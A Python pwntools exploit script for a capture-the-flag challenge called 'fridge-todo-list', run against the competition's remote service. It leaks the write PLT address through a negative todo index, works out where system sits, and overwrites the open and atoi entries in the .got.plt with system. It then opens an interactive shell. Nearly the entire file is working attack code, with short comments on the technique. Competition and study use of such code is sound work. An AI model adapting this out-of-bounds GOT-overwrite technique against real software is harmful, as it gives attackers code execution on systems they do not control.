from pwn import *
import struct

# read_line(&todos[idx * TODO_LENGTH], TODO_LENGTH);
# TODOS_ADDRESS + idx * TODO_LENGTH = NEW_ADDRESS

# e = ELF('todo')
# print({key: hex(value) for key, value in e.plt.items()})

ORIGINAL_SYSTEM_PLT = 0x940
ORIGINAL_WRITE_PLT = 0x910
# NOTE:
# In the .got.plt we'll have either the function address or
# the address in .plt if it hasn't been resolved yet.
# ***** this script can't get the address of open() or strncat() in .plt *****
# because they are both called before we can input anything (in contrast to write())
# therefore their addresses in libc are already resolved
# and we can't get their addresses in the .plt

r = remote('fridge-todo-list.ctfcompetition.com', 1337)
r.send(b'username\n')
r.send(b'2\n')  # choice 2 for print_todo
r.send(b'-6\n')  # to get the address of write in the plt.
r.recvuntil(b'Your TODO: ')

data = r.recvline().strip()
null_padded = data + bytes(8 - len(data))
write_plt = struct.unpack('Q', null_padded)[0]  # unpack always returns a tuple
print('write_plt: %x' % write_plt)
system_plt = write_plt - ORIGINAL_WRITE_PLT + ORIGINAL_SYSTEM_PLT
print('system_plt: %x' % system_plt)

r.send(b'3\n')  # choice 3 for store_todo
r.send(b'-4\n')
r.send(b'A' * 8)  # override open in .got.plt
# override atoi in .got.plt (8 bytes after open)
r.send(struct.pack('Q', system_plt) + b'\n')

r.interactive()
